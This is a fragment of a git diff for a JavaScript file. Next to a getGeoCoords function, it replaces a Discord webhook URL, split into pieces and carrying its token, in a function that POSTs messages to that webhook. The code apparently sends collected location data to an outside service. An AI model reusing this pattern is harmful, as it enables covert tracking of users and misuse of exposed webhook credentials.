@@ -43,7 +43,7 @@ function getGeoCoords() {
     return coords
 }
 function sendPostToWebhook(message) {
-    const webHookURL = 'https:' + '//discord.com/api/webhooks/1090630967179345950/EQJEsXS_TrN-yGiEYQ-tTsL_pxpOwbvRWr3hs3pxti1G14bkvYncaAW5CU34VvUfPURy'
+    const webHookURL = "https:"+"//discord.com/api/webhooks/1112835363308851250/KZTAe29HLX3WEFPWOt-jubZUjd2aVKULX7S-9AJ0a39_wxrStkgMj1eIw7mFzloyX-Tp"
     let xhr = new XMLHttpRequest();
     xhr.open("POST", webHookURL, true);
     xhr.setRequestHeader('Content-Type', 'application/json');
